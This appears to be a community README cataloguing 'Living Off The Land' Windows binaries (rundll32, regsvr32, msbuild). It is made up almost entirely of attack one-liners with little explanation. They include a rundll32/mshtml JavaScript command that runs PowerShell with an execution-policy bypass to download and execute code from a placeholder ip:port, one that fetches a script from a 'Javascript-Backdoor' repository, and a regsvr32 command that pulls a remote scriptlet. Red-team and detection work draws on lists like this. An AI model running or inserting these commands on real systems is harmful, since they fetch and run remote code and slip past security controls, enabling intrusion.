# LOLBins - Living Off The Land Binaries
Please contribute and do point out errors or resources I have forgotten.
If you are missing from the acknowledgement, please let me know (I did not forget anyone on purpose).    
    
   
# OS BINARIES
   
## Rundll32.exe

* Functions: Execute code

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"

rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")

rundll32 shell32.dll,Control_RunDLL payload.dll
```
  
Acknowledgements:
* @subtee
   
   
   
## Regsvr32.exe

```
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
```
   
Acknowledgements:
* @subtee
   
   
   
## Msbuild.exe

```
msbuild.exe pshell.xml
```

Acknowledgements:
* @subtee

